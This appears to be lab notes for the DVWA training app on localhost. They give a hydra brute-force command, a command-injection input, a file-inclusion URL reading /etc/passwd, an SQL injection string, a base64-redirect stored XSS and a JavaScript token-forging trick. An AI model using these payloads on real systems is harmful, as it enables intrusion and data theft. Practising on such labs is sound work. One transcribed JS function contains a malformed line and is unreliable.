# Part 1

## Attacks

### Brute Force

:::info
Obtain the cookie `PHPSESSID` in:

`F12` → Application → Cookies(DropDown) → `https://localhost` → `PHPSESSID`
:::

``` bash
hydra -l admin \
-P /usr/share/dict/rockyou.txt \
-t 4 -f localhost http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=COOKIE_HERE; security=medium:F=password incorrect"

```

### Command Injection

``` bash
127.0.0.1 | uname -son
```

### File Inclusion

`http://localhost/vulnerabilities/fi/?page=/etc/passwd`

### SQL Injection

``` sql
1 OR 1=1
```

### XSS (Stored)

``` js
<ScRiPt>window.location.href=atob('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==')</sCRiPT>
```

### JavaScript Attacks

`http://localhost/vulnerabilities/javascript/source/medium.js`

``` js
// this just reverses
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("phrase").value + "XX")
}
```

* Set phrase into "token"
* run `document.getElementById("token").value = "XXsseccusXX";` in console
* submit :3
